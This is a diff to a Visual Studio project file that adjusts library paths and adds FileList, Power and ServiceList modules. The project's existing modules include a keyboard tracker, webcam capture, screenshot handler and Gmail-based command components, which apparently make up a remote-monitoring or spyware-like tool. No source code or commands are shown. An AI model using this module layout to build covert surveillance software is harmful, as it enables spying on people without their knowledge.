@@ -131,7 +131,7 @@
     <Link>
       <SubSystem>Console</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalLibraryDirectories>C:\openssl-3.3.2\build\lib;C:\curl-8.10.1\x64 Debug\libcurl-vc17-x64-debug-static-ipv6-sspi-schannel\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <AdditionalLibraryDirectories>C:\openssl-3.3.2\build\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
       <AdditionalDependencies>gdi32.lib;user32.lib;libcrypto.lib;libssl.lib;Normaliz.lib;Ws2_32.lib;Wldap32.lib;Crypt32.lib;advapi32.lib;strmiids.lib;format.lib;ole32.lib;C:\vcpkg\packages\curl_x64-windows-static\debug\lib\libcurl-d.lib;C:\vcpkg\packages\jsoncpp_x64-windows-static\debug\lib\jsoncpp.lib;C:\vcpkg\packages\zlib_x64-windows-static\debug\lib\zlibd.lib</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
@@ -154,12 +154,14 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="Client\Client_Gmail.cpp" />
     <ClCompile Include="Client\HttpClient.cpp" />
     <ClCompile Include="Functions\EmailFetcher.cpp" />
+    <ClCompile Include="Functions\FileList.cpp" />
     <ClCompile Include="Functions\KeyboardTracker.cpp" />
+    <ClCompile Include="Functions\Power.cpp" />
     <ClCompile Include="Functions\RunningApps.cpp" />
     <ClCompile Include="Functions\ScreenshotHandler.cpp" />
+    <ClCompile Include="Functions\ServiceList.cpp" />
     <ClCompile Include="Functions\WebcamCapture.cpp" />
     <ClCompile Include="GmailAPI\CurlWrapper.cpp" />
     <ClCompile Include="GmailAPI\GmailAPI.cpp" />
@@ -171,12 +173,14 @@
     <ClCompile Include="Server\ServerManager.cpp" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="Client\Client_Gmail.h" />
     <ClInclude Include="Client\HttpClient.h" />
     <ClInclude Include="Functions\EmailFetcher.h" />
+    <ClInclude Include="Functions\FileList.h" />
+    <ClInclude Include="Functions\Power.h" />
     <ClInclude Include="Functions\KeyboardTracker.h" />
     <ClInclude Include="Functions\RunningApps.h" />
     <ClInclude Include="Functions\ScreenshotHandler.h" />
+    <ClInclude Include="Functions\ServiceList.h" />
     <ClInclude Include="Functions\WebcamCapture.h" />
     <ClInclude Include="GmailAPI\CurlWrapper.h" />
     <ClInclude Include="GmailAPI\GmailAPI.h" />
